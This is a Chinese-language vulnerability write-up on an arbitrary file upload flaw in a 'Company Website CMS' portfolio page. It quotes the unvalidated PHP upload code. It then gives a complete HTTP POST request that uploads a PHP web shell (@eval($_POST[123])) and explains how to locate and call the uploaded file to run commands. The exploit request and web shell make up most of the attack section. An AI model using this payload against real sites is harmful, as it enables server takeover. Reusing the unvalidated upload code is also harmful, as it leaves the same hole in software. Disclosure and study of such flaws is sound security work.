# Company Website CMS

Company Website CMS在创建/dashboard/Portfolio页面，后端代码无限制，导致任意文件上传漏洞。

后端代码为：

```php
$uploads_dir = 'uploads/portfolio';

        $tmp_name = $_FILES["ufile"]["tmp_name"];
        // basename() may prevent filesystem traversal attacks;
        // further validation/sanitation of the filename may be appropriate
        $name = basename($_FILES["ufile"]["name"]);
        $random_digit=rand(0000,9999);
        $new_file_name=$random_digit.$name;

        move_uploaded_file($tmp_name, "$uploads_dir/$new_file_name");
```

可以看出是一个无限制的文件上传，只有文件名被随机值拼接然后移动。

上传页面为：

![image-20250309215745498](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092157549.png)

上传文件：

![image-20250309215920374](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092159410.png)

使用payload为：

```
POST /vogue/dashboard/createportfolio HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Length: 839
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/vogue/dashboard/createportfolio
Cookie: PHPSESSID=8udk6re20tpda96ncs7of8bb94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_title"

file upload text222222222222
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_desc"

uploaduploaduploaduploaduploaduploadupload
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_detail"

uploaduploaduploaduploaduploaduploaduploaduploadupload
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="ufile"; filename="text.php"
Content-Type: application/octet-stream

<?php echo "portfolio"; @eval($_POST[123]); ?>
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="save"


------geckoformboundaryafbda5700eee89a77231823337f34d28--

```

上传问文件后，可以看到前台的正常图标内容被挤到旁边去了：

![image-20250309220034549](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092200619.png)

但是这里有有点乱了，可以直接看源代码然后搜关键词：
![image-20250309182520661](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092200009.png)

同样拿到文件名，然后访问就可以进行命令执行了：

![image-20250309182556560](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092200007.png)

————————